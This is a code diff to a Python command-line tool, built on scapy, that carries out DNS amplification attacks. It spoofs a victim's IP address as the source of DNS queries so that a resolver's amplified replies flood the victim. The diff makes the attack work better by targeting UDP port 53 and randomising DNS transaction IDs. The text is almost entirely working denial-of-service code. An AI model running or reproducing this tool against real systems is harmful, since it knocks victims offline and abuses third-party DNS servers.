@@ -1,7 +1,7 @@
 import click
 from scapy.all import DNS, DNSQR, IP, UDP, send
 
-from cli.utils.common import get_dns_ip, get_victim_ip
+from cli.utils.common import get_dns_ip, get_victim_ip, rand_int
 
 time_to_live = 128
 query_name = "google.com"
@@ -45,15 +45,15 @@ def dns_amplification(ctx, ip, dns_ip, count, mode):
         f"{mode} DNS Amplification attack on {ip} by DNS server {dns_ip} started!"
     )
 
-    num = 0
     for _ in range(count):
         for i in range(len(query_type)):
             packet = (
-                IP(src=ip, dst=dns_ip, ttl=time_to_live)
-                / UDP()
-                / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
+                IP(src=ip, dst=dns_ip)
+                / UDP(dport=53)
+                / DNS(
+                    id=rand_int(),
+                    rd=1,
+                    qd=DNSQR(qname=query_name, qtype=query_type[i]),
+                )
             )
             send(packet, verbose=0)
-            click.clear()
-            click.echo(f"Total {num} packages sent\n")
-            num += 1
